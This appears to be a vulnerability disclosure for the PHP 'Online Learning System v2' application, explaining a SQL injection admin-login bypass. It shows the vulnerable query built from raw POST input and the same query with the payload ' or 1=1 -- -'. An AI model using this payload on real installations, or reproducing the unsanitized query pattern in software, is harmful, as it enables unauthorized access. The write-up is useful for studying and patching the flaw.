# online-learning-system-v2-sqli-authentication-bypass-file-upload-unauthenticated-RCE
* Exploit title : online-learning-system-v2-sqli-authentication-bypass-file-upload-unauthenticated-RCE
* Vendor Homepage : https://github.com/oretnom23  / https://www.sourcecodester.com/php/14929/online-learning-system-v2-using-php-free-source-code.html
* Software Link : https://www.sourcecodester.com/sites/default/files/download/oretnom23/elearning_v2_0.zip
## Sql injection authentication bypass
* the attacker can bypass admin login from by submitting sql qurey in the username paramater : 
before the injection
```php
	public function login(){
		extract($_POST);

		$qry = $this->conn->query("SELECT * from users where username = '$username' and password = md5('$password') ");
		if($qry->num_rows > 0){
			foreach($qry->fetch_array() as $k => $v){
				if(!is_numeric($k) && $k != 'password'){
					$this->settings->set_userdata($k,$v);
				}
```
after the injection
```php
	public function login(){
		extract($_POST);

		$qry = $this->conn->query("SELECT * from users where username = '$username' or 1=1 -- -' and password = md5('$password') ");
		if($qry->num_rows > 0){
			foreach($qry->fetch_array() as $k => $v){
				if(!is_numeric($k) && $k != 'password'){
					$this->settings->set_userdata($k,$v);
				}
```
it doesn't matter if username supplied is exsists or not the most important thing is the booleon injection (or 1=1) it will return true and let us login without supllying password
everything after this qurey (or 1=1 -- -) will be ignored bc of the comment (-- -)
